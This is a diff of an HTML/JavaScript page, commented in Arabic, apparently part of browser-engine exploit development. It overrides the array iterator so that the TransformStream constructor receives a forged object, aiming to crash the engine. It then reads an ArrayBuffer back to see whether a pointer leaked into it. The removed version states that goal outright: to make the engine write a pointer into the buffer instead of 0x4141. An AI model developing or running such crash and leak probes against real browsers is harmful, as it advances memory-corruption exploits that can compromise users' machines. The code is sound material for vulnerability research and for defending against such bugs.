@@ -1,27 +1,16 @@
+<!DOCTYPE html>
 <html>
 <body>
-<div id="result">Testing...</div>
+<div id="status">Running...</div>
 <script>
-// اكتب النتيجة فوراً قبل أي شيء
-document.getElementById("result").textContent = "Step 1: Starting...";
+// 1. مسح أي بيانات سابقة
+localStorage.removeItem('crash_result');
 
-// استخدم ArrayBuffer صغير
+// 2. تسجيل أننا بدأنا
+localStorage.setItem('crash_result', 'STARTED');
+
 let buf = new ArrayBuffer(8);
 let view = new DataView(buf);
-let f64 = new Float64Array(buf);
-
-// Variant: مرر كائن يحتوي على Float64Array
-// الهدف: جعل المحرك يكتب مؤشراً في buf بدل الكتابة في 0x4141
-let trick = {
-    size: 0,
-    highWaterMark: 0,
-    type: undefined,
-    start: undefined,
-    pull: undefined,
-    cancel: undefined,
-    buf: buf,
-    f64: f64
-};
 
 try {
     Array.prototype[Symbol.iterator] = function() {
@@ -32,33 +21,42 @@ try {
                 if (i >= arr.length)
                     return { done: true };
                 let val = arr[i];
-                if (arr.length === 3 && i >= 1)
-                    val = trick;
+                
+                // تسجيل حالة المكرر قبل المرور للكائن الخاطئ
+                if (arr.length === 3 && i >= 1) {
+                    localStorage.setItem('crash_result', 'ABOUT_TO_CRASH_AT_INDEX_' + i);
+                    val = { fake: true, pad: 0x41414141 };
+                }
                 i++;
                 return { value: val, done: false };
             }
         };
     };
 
-    // هذا قد يكرش أو قد لا يكرش
+    // 3. تسجيل أننا على وشك استدعاء TransformStream
+    localStorage.setItem('crash_result', 'BEFORE_TRANSFORMSTREAM');
+    
     let stream = new TransformStream();
     
-    // إذا وصلنا هنا، لم يكرش!
-    document.getElementById("result").textContent = "NO CRASH! buf = " + f64[0];
+    // 4. إذا وصلنا هنا، يعني لم يكرش!
+    localStorage.setItem('crash_result', 'NO_CRASH_SUCCESS');
+    
+    // محاولة قراءة buf
+    let hex = "";
+    for (let j = 0; j < 8; j++) {
+        hex += view.getUint8(j).toString(16) + " ";
+    }
+    localStorage.setItem('crash_data', hex);
+    
+    document.getElementById("status").textContent = "SUCCESS! Check localStorage.";
     
 } catch(e) {
-    // إذا وصلنا هنا، الـ TypeError تم التقاطه
-    document.getElementById("result").textContent = "CAUGHT: " + e.message;
-    
-    // تحقق من buf
-    let hex = "";
-    for (let i = 0; i < 8; i++) {
-        hex += view.getUint8(i).toString(16).padStart(2, '0') + " ";
-    }
-    document.getElementById("result").textContent += " | buf: " + hex;
+    // 5. إذا تم التقاط الخطأ (TypeError) بدل الـ Crash
+    localStorage.setItem('crash_result', 'CAUGHT_EXCEPTION: ' + e.message);
+    document.getElementById("status").textContent = "Caught: " + e.message;
 }
 
-// استعادة
+// استعادة المكرر
 Array.prototype[Symbol.iterator] = [][Symbol.iterator];
 </script>
 </body>
